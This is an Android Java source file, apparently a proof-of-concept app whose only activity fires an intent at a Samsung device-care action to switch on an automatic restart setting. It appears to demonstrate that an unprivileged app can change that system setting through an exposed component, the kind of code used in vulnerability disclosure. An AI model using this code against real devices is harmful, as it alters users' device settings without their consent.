package poc.app;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;

public class MainActivity extends Activity {
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        Intent i = new Intent("com.samsung.android.sm.ACTION_AUTO_RESET_SETTING");
        i.putExtra("turn on off auto restart", true);
        startActivity(i);
    }
}